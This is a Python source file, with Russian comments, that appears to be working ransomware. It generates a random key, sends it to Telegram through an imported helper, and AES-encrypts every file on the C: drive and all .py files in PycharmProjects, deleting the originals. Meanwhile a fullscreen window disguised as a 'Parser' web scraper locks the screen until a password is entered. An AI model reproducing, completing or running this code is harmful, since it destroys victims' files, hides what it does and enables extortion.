import os
import sys
import pyAesCrypt
import secrets
import string
from threading import Thread
from pyautogui import click, moveTo, FailSafeException
from tkinter import Tk, Entry, Label
from time import sleep

from send_password import send_password_to_telegram

user_path = os.path.join(os.environ["USERPROFILE"])

def find_pycharm_projects():
    # Указываем директорию, с которой нужно начинать поиск (например, на диске C:)
    search_start_dir = "C:\\"  # На Windows ищем с корня диска C

    for root, dirs, files in os.walk(search_start_dir):
        if 'PycharmProjects' in dirs:  # Проверяем, существует ли папка PycharmProjects в текущем каталоге
            return os.path.join(root, 'PycharmProjects')
    return None

pycharm_projects_path = find_pycharm_projects()
# Список директорий для шифрования и указания расширений
directories = [
    (pycharm_projects_path, ".py"),
    (r"C:\\", None),  # None означает все расширения
]

def generate_password(length=12):
    # Набор символов для генерации пароля
    chars = string.ascii_letters + string.digits + string.punctuation
    # Генерация случайного пароля
    password = ''.join(secrets.choice(chars) for i in range(length))
    return password

# Генерация случайных паролей
crypt_pass = generate_password(16)  # Для шифрования
locker_pass = generate_password(12)  # Для блокировки

# Отправка пароля в Telegram
send_password_to_telegram(crypt_pass)

def locker():
    global k, entry
    try:
        with open("sites.txt", "r", encoding="utf-8") as file:
            sites = file.read().strip().splitlines()  # Читаем строки и разделяем их
    except FileNotFoundError:
        sites = ["Файл sites.txt не найден."]

    def callback(event):
        global k
        if entry.get() == locker_pass:
            k = True

    def block():
        try:
            pass
        except FailSafeException:
            pass

        root.attributes("-fullscreen", True)
        root.protocol("WM_DELETE_WINDOW", block)
        root.update()
        root.bind('<Control-KeyPress-c>', callback)

    root = Tk()
    root.title("Parser")
    root.attributes("-fullscreen", True)
    entry = Entry(root, font=1)
    label0 = Label(root, text="Parser_v1", font=1)
    label0.grid(row=0, column=0)

    # Разделение на две колонки
    half = len(sites) // 2 + len(sites) % 2  # Учитываем нечетное количество
    column1 = sites[:half]
    column2 = sites[half:]
    # Форматирование текста для двух колонок
    sites_text = "\n".join(f"{c1:<30}{c2}" for c1, c2 in zip(column1, column2 + [""] * (len(column1) - len(column2))))

    # Метка с текстом из файла
    label_instruction = Label(
        root,
        text=f"Не закрывайте окно! Парсим данные с сайтов:\n{sites_text}",
        font="Arial 20",
        justify="left",
    )
    label_instruction.place(x=50, y=50)

    entry.place(width=150, height=50, x=600, y=400)
    root.update()
    sleep(0.2)
    click(675, 420)
    k = False
    while not k:
        block()

def crypter():
    def crypt(file):
        try:
            print(file)
            password = crypt_pass
            bufferSize = 512 * 1024
            pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
            os.remove(file)
        except OSError as e:
            print(f"Ошибка при обработке файла {file}: {e}")
        except ValueError as e:
            print(f"Невозможно прочитать файл {file}: {e}")

    def walk(dir, ext):
        try:
            for name in os.listdir(dir):
                path = os.path.join(dir, name)
                # Пропускаем папки, в которых есть 'venv' в названии
                if 'venv' in name.lower():
                    continue  # Пропускаем эту папку

                if os.path.isfile(path) and (ext is None or path.endswith(ext)):
                    crypt(path)
                elif os.path.isdir(path):
                    walk(path, ext)
        except FileNotFoundError:
            print(f"Директория {dir} не найдена. Пропускаем...")
        except PermissionError:
            print(f"Нет доступа к директории {dir}. Пропускаем...")

    for directory, ext in directories:
        print(f"Начинаем шифрование в {directory} с расширением {ext if ext else 'все файлы'}...")
        walk(directory, ext)

    print("Encryption complete.")
    # os.remove(sys.argv[0])

thread_1 = Thread(target=locker)
thread_2 = Thread(target=crypter)

thread_1.start()
thread_2.start()

thread_1.join()
thread_2.join()
